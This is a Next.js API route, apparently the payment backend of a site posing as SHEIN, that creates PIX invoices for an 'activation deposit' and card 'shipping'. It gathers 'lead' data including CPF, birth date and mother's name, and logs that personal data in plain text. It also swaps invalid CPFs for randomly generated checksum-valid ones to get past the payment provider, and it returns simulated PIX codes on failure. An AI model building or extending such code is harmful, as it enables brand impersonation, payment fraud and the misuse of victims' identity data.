import { type NextRequest, NextResponse } from "next/server"

// Função para validar CPF
function validateCPF(cpf: string): boolean {
  cpf = cpf.replace(/[^\d]/g, "")
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  if (remainder !== Number.parseInt(cpf.charAt(9))) return false

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += Number.parseInt(cpf.charAt(i)) * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  return remainder === Number.parseInt(cpf.charAt(10))
}

// Função para gerar CPF válido
function generateValidCPF(): string {
  const cpf = Array.from({ length: 9 }, () => Math.floor(Math.random() * 10))

  let sum = 0
  for (let i = 0; i < 9; i++) {
    sum += cpf[i] * (10 - i)
  }
  let remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  cpf.push(remainder)

  sum = 0
  for (let i = 0; i < 10; i++) {
    sum += cpf[i] * (11 - i)
  }
  remainder = (sum * 10) % 11
  if (remainder === 10 || remainder === 11) remainder = 0
  cpf.push(remainder)

  return cpf.join("")
}

// Função para obter IP do cliente
function getClientIP(request: NextRequest): string {
  const forwarded = request.headers.get("x-forwarded-for")
  const realIP = request.headers.get("x-real-ip")

  if (forwarded) {
    return forwarded.split(",")[0].trim()
  }
  if (realIP) {
    return realIP
  }
  return "192.168.1.1" // Fallback
}

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA SUPERPAYBR ===")

    const body = await request.json()
    const { amount, shipping, method } = body

    console.log("Dados recebidos:", { amount, shipping, method })

    // Validar dados obrigatórios
    if (!amount) {
      return NextResponse.json(
        {
          success: false,
          error: "Valor não fornecido",
        },
        { status: 400 },
      )
    }

    // Obter access token
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`)
    const authData = await authResponse.json()

    if (!authData.success) {
      console.log("❌ Falha na autenticação SuperPayBR, usando fallback")
      return createSimulatedInvoice(request, body)
    }

    const { access_token } = authData.data

    // Carregar dados reais do usuário coletados durante o fluxo
    const getUserData = () => {
      try {
        const cpfDataStr = request.headers.get("x-cpf-data") || "{}"
        const cpfData = JSON.parse(cpfDataStr)
        const userEmail = request.headers.get("x-user-email") || ""
        const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
        const deliveryAddressStr = request.headers.get("x-delivery-address") || "{}"
        const deliveryAddress = JSON.parse(deliveryAddressStr)

        return {
          nome: cpfData.nome || "Cliente SHEIN",
          cpf: cpfData.cpf || "12345678901",
          email: userEmail || "cliente@shein.com.br",
          telefone: userWhatsApp || "11999999999",
          dataNascimento: cpfData.dataNascimento || "",
          nomeMae: cpfData.nomeMae || "",
          endereco: {
            rua: deliveryAddress.street || "Rua Exemplo",
            numero: deliveryAddress.number || "123",
            complemento: deliveryAddress.complement || "",
            bairro: deliveryAddress.neighborhood || "Centro",
            cidade: deliveryAddress.city || "São Paulo",
            estado: deliveryAddress.state || "SP",
            cep: deliveryAddress.zipCode?.replace(/\D/g, "") || "01000000",
          },
        }
      } catch (error) {
        console.log("⚠️ Erro ao carregar dados do usuário, usando fallback:", error)
        return {
          nome: "Cliente SHEIN",
          cpf: "12345678901",
          email: "cliente@shein.com.br",
          telefone: "11999999999",
          endereco: {
            rua: "Rua Exemplo",
            numero: "123",
            bairro: "Centro",
            cidade: "São Paulo",
            estado: "SP",
            cep: "01000000",
          },
        }
      }
    }

    const userData = getUserData()

    console.log("📋 Dados do lead carregados:")
    console.log("Nome:", userData.nome)
    console.log("CPF:", userData.cpf)
    console.log("Email:", userData.email)
    console.log("Telefone:", userData.telefone)

    // Validar e corrigir CPF se necessário
    let document = userData.cpf?.replace(/[^\d]/g, "") || ""
    if (!validateCPF(document)) {
      console.log("⚠️ CPF inválido, gerando CPF válido para teste")
      document = generateValidCPF()
      console.log("CPF gerado:", document)
    } else {
      console.log("✅ CPF válido:", document)
    }

    const totalAmount = Number.parseFloat(amount.toString())
    const isActivation = shipping === "activation" || method === "ATIVAÇÃO"
    const productTitle = isActivation
      ? "Depósito de Ativação - Conta Digital SHEIN"
      : `Frete ${method || shipping?.toUpperCase() || "SEDEX"} - Cartão SHEIN`

    // Gerar external_id único
    const externalId = isActivation
      ? `SHEIN_ACT_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
      : `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    // Preparar payload SuperPayBR
    const invoicePayload = {
      client: {
        name: userData.nome,
        document: document,
        email: userData.email,
        phone: userData.telefone?.replace(/[^\d]/g, "") || "11999999999",
        ip: getClientIP(request),
        address: {
          street: userData.endereco.rua,
          number: userData.endereco.numero,
          district: userData.endereco.bairro,
          city: userData.endereco.cidade,
          state: userData.endereco.estado,
          zipcode: userData.endereco.cep,
          country: "BR",
        },
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: externalId,
        installment: "1",
        order_url: isActivation ? `${request.nextUrl.origin}/upp/checkout` : `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: isActivation ? "activation" : "1",
            image: `${request.nextUrl.origin}/shein-card-logo-new.png`,
            title: productTitle,
            qnt: 1,
            discount: 0,
            amount: totalAmount,
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("📤 Enviando para SuperPayBR:", JSON.stringify(invoicePayload, null, 2))

    // Fazer requisição para SuperPayBR
    const response = await fetch("https://api.superpaybr.com/v4/invoices", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${access_token}`,
      },
      body: JSON.stringify(invoicePayload),
    })

    console.log("📥 Resposta SuperPayBR:", {
      status: response.status,
      statusText: response.statusText,
      ok: response.ok,
    })

    if (response.ok) {
      const data = await response.json()
      console.log("✅ Fatura SuperPayBR criada com sucesso!")

      const invoiceData = {
        id: data.fatura.id,
        invoice_id: data.fatura.invoice_id,
        external_id: externalId,
        pix: {
          payload: data.fatura.pix.payload,
          image: data.fatura.pix.image,
          qr_code: data.fatura.pix.image, // SuperPayBR já retorna a imagem do QR Code
        },
        status: data.fatura.status,
        valores: data.fatura.valores,
        vencimento: data.fatura.vencimento,
        secure: data.fatura.secure,
        type: "real" as const,
      }

      console.log(`✅ Fatura criada - External ID: ${externalId} - Valor: R$ ${totalAmount.toFixed(2)}`)

      return NextResponse.json({
        success: true,
        data: invoiceData,
        fallback: false,
      })
    } else {
      const errorText = await response.text()
      console.log("❌ Erro na API SuperPayBR:", response.status, errorText)
      return createSimulatedInvoice(request, body)
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura SuperPayBR:", error)
    return createSimulatedInvoice(request, body)
  }
}

async function createSimulatedInvoice(request: NextRequest, body: any) {
  const { amount, shipping, method } = body
  const totalAmount = Number.parseFloat(amount?.toString() || "34.90")
  const externalId = `SHEIN_SIM_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

  const simulatedPixCode = `00020101021226580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/SIM${Date.now()}5204000053039865406${totalAmount.toFixed(2)}5802BR5909SHEIN5011SAO PAULO62070503***6304SIMS`

  const simulatedInvoice = {
    id: `SIM_${Date.now()}`,
    invoice_id: `SIMULATED_${Date.now()}`,
    external_id: externalId,
    pix: {
      payload: simulatedPixCode,
      image: `/placeholder.svg?height=250&width=250`,
      qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(simulatedPixCode)}`,
    },
    status: {
      code: 1,
      title: "Aguardando Pagamento",
      text: "pending",
    },
    valores: {
      bruto: Math.round(totalAmount * 100),
      liquido: Math.round(totalAmount * 100),
    },
    vencimento: {
      dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
    },
    secure: {
      id: `simulated-${Date.now()}`,
      url: `${request.nextUrl.origin}/checkout`,
    },
    type: "simulated" as const,
  }

  console.log(`✅ Fatura simulada criada - External ID: ${externalId} - Valor: R$ ${totalAmount.toFixed(2)}`)

  return NextResponse.json({
    success: true,
    data: simulatedInvoice,
    fallback: true,
  })
}
